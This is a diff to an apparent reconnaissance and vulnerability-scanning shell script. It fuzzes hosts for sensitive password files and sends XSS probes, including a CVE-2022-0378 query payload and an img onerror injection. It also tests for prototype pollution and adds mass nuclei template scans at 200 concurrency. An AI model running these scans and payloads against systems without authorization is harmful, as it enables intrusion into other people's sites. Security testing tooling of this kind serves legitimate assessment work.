@@ -35,7 +35,7 @@ echo '\033[0;34m SORTING THE PROBED TARGETS AND OUTPUT IN VALID_PROBED_SORTED.tx
 cat VALID_PROBED_TARGETS.txt | sort -u | tee -a VALID_PROBED_SORTED.txt
 sleep 3;
 for i in $(cat VALID_PROBED_SORTED.txt); do
-	ffuf -w /opt/password_sensitive_files.txt:FUZZ -u $i:FUZZ | grep 'Status: 200' ; done
+	ffuf -w /opt/password_sensitive_files.txt:FUZZ -u $i:FUZZ -s | grep 'Status: 200' ; done
 echo '\033[0;35m TESTING FOR WAYBACKURLS'
 cat VALID_PROBED_SORTED.txt | waybackurls | tee -a WAYBACKURLS.txt
 sleep 2;
@@ -51,6 +51,14 @@ echo 'test for Prototype Pollution'
 sed 's/$/\/?__proto__[testparam]=exploit\//' VALID_PROBED_SORTED.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
 echo 'TEST FOR CVE-2022-0378'
 cat VALID_PROBED_SORTED.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
+echo -e "Scanning for template based vulnerabilities"
+nuclei -update-templates &> /dev/null
+mkdir nuclei_output/
+cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity low -c 200 -silent; done | anew -q nuclei_output/low.txt
+cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity medium -c 200 -silent; done | anew -q nuclei_output/medium.txt
+cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity high -c 200 -silent; done | anew -q nuclei_output/high.txt
+cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity critical -c 200 -silent; done | anew -q nuclei_output/critical.txt
+
 echo '\033[0m LETS TEST FOR XSS'
 cat WAYBACKURLS.txt | grep -Ev "\.(jpeg|jpg|png|ico)$" | grep '=' | qsreplace "<img src=x onerror=alert(1)>" | ~/go/bin/httpx -silent -nc -mr "<img src=x onerror=alert(1)>" -mc 200
 
